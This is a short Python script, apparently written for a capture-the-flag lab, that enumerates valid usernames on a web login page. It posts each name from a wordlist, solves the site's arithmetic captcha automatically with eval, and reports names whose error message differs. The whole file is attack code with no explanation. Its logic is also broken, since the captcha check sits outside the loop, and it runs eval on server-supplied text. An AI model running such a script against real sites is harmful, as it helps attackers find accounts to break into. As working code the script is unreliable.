#!/usr/bin/env python3

import requests
import re


url = "http://10.10.143.15/login"

with open("usernames.txt","r") as f:
    usernames = [i.strip() for i in f.readlines()]

print("[+] Usernames extracted !")

for username in usernames:
    data  = {"username":username,"password":"asdasd"}
    r = requests.post(url, data=data)

if "Captcha enabled" in r.text:

    exp = re.search(r'([0-9]+)\s*([+\-*/])\s*([0-9]+)', r.text).group(0)
    result= eval(exp)
    data2 = {"username":username,"password":"asdasd","captcha":result}
    r2 = requests.post(url, data=data2)

    if "does not exist" in r2.text:
        print("[!] Invalid: "+username)

    elif "Invalid captcha" in r2.text:
        print("[!] Captch failed")

    else:
        print("Username found : ",username)
        exit(0)

